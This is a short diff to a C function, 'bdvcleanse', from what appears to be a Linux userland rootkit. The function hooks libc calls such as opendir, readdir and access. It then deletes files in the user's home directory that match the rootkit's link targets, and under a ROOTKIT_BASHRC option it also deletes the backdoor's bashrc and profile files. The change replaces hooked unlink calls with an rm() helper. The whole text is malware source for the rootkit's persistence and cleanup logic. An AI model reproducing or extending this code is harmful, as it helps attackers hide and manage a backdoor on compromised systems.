@@ -5,7 +5,7 @@ void bdvcleanse(void){
     size_t pathlen;
     struct stat pathstat;
 
-    hook(COPENDIR, CREADDIR, CACCESS, CUNLINK, C__LXSTAT);
+    hook(COPENDIR, CREADDIR, CACCESS, C__LXSTAT);
 
     dp = call(COPENDIR, HOMEDIR);
     if(dp == NULL) return; // oh no
@@ -32,11 +32,11 @@ void bdvcleanse(void){
 
         for(i = 0; i < LINKSRCS_SIZE; i++)
             if(!strcmp(basename(linkdests[i]), dir->d_name))
-                call(CUNLINK, path);
+                rm(path);
     }
     closedir(dp);
 #ifdef ROOTKIT_BASHRC
-    call(CUNLINK, BASHRC_PATH);
-    call(CUNLINK, PROFILE_PATH);
+    rm(BASHRC_PATH);
+    rm(PROFILE_PATH);
 #endif
 }
